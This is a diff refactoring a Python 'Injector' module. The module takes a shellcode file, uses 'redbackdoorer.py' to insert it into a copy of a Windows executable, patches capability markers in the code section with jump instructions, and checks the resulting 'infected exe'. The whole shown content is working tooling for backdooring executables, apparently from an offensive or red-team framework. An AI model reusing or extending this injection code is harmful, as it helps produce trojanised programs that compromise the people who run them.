@@ -11,13 +11,14 @@ from project import project
 logger = logging.getLogger("Injector")
 
 
-def inject_exe(shc_file: FilePath):
-    exe_in: FilePath = project.inject_exe_in
-    exe_out: FilePath = project.inject_exe_out
-    exe_capabilities: ExeCapabilities = project.exe_capabilities
-
+def inject_exe(
+    shellcode_in: FilePath,
+    exe_in: FilePath,
+    exe_out: FilePath,
+    exe_capabilities: ExeCapabilities,
+):
     logger.info("--[ Injecting: {} into: {} -> {} ".format(
-        shc_file, exe_in, exe_out
+        shellcode_in, exe_in, exe_out
     ))
 
     # create copy of file exe_in to exe_out
@@ -29,7 +30,7 @@ def inject_exe(shc_file: FilePath):
         "python3.exe",
         "redbackdoorer.py",
         project.inject_mode,
-        shc_file,
+        shellcode_in,
         exe_out
     ])
 
@@ -40,8 +41,7 @@ def inject_exe(shc_file: FilePath):
         code = extract_code_from_exe(exe_out)
         for cap in exe_capabilities.get_all().values():
             if not cap.id in code:
-                logger.error("Capability ID {} not found, abort".format(cap.id))
-                raise Exception()
+                raise Exception("Capability ID {} not found, abort".format(cap.id))
             
             off = code.index(cap.id)
             current_address = off + exe_capabilities.image_base + exe_capabilities.text_virtaddr
@@ -53,10 +53,12 @@ def inject_exe(shc_file: FilePath):
                 current_address, destination_address
             )
             code = code.replace(cap.id, jmp)
-            write_code_section(exe_out, code)
+
+        # write back our patched code into the exe
+        write_code_section(exe_file=exe_out, new_data=code)
 
      
-def verify_injected_exe(exefile):
+def verify_injected_exe(exefile: FilePath):
     logger.info("---[ Verify infected exe: {} ".format(exefile))
     # remove indicator file
     pathlib.Path(project.verify_filename).unlink(missing_ok=True)
